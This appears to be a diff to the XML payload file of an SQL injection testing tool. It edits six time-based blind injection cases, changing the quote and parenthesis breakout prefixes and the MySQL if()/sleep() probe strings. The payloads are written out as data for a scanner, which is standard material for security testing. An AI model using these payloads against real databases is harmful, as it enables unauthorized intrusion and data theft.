@@ -128,39 +128,39 @@
     </BoolBasedTestCase>
     <TimeBasedTestCase num="6">
         <case id="1">
-            <inject>' or if(1=1, sleep(</inject>
+            <inject>1' and if(1=1, sleep(</inject>
             <injectPost>), 0) #</injectPost>
-            <identify>' and if(1=2, sleep(0), 0) #</identify>
+            <identify>' and if(1=1, sleep(0), 0) #</identify>
             <identifyPost>NULL</identifyPost>
         </case>
         <case id="2">
-            <inject>" or if(1=1, sleep(</inject>
+            <inject>" and if(1=1, sleep(</inject>
             <injectPost>), 0) #</injectPost>
-            <identify>" and if(1=2, sleep(0), 0) #</identify>
+            <identify>" and if(1=1, sleep(0), 0) #</identify>
             <identifyPost>NULL</identifyPost>
         </case>
         <case id="3">
-            <inject>') or if(1=1, sleep(</inject>
+            <inject>') and if(1=1, sleep(</inject>
             <injectPost>), 0) #</injectPost>
-            <identify>') and if(1=2, sleep(0), 0) #</identify>
+            <identify>') and if(1=1, sleep(0), 0) #</identify>
             <identifyPost>NULL</identifyPost>
         </case>
         <case id="4">
-            <inject>") or if(1=1, sleep(</inject>
+            <inject>") and if(1=1, sleep(</inject>
             <injectPost>), 0) #</injectPost>
-            <identify>") and if(1=2, sleep(0), 0) #</identify>
+            <identify>") and if(1=1, sleep(0), 0) #</identify>
             <identifyPost>NULL</identifyPost>
         </case>
         <case id="5">
-            <inject>23 or if(1=1, sleep(</inject>
+            <inject> and if(1=1, sleep(</inject>
             <injectPost>), 0) #</injectPost>
-            <identify>23 or and(1=2, sleep(0), 0) #</identify>
+            <identify>and if(1=1, sleep(0), 0) #</identify>
             <identifyPost>NULL</identifyPost>
         </case>
         <case id="6">
-            <inject>12345) or if(1=1, sleep(</inject>
+            <inject>) and if(1=1, sleep(</inject>
             <injectPost>), 0) #</injectPost>
-            <identify>12345) and if(1=2, sleep(0), 0) #</identify>
+            <identify>) and if(1=1, sleep(0), 0) #</identify>
             <identifyPost>NULL</identifyPost>
         </case>
     </TimeBasedTestCase>
